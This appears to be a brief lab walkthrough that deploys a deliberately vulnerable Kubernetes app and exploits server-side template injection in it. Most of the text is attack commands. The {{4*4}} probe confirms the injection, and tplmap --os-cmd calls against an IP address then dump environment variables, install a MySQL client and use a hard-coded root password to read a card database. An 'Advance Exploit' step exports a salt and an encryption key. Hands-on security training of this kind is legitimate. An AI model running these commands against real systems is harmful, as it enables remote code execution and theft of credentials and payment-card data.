# TmKub


curl -sfL https://get.k3s.io | sh -

sudo kubectl get nodes

sudo kubectl apply -f template-injection-manifest.yml

sudo watch kubectl get pods

http GET http://localhost:32345/not-found?page={{4*4}}

python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'printenv'

python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'printenv|grep MYSQL'

python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'apk update && apk add mysql-client'

python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'mysql -u root --password=S3cr3tPa55w0rd -e "show tables from carddb;"'

python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'mysql -u root --password=S3cr3tPa55w0rd -e "select * from carddb.cards;"'


Advance Exploit :

export SALT=<environment-SALT-value>Copy
  
export ENC_KEY=<environment-ENC_KEY-value>

sudo kubectl delete -f template-injection-manifest.yml
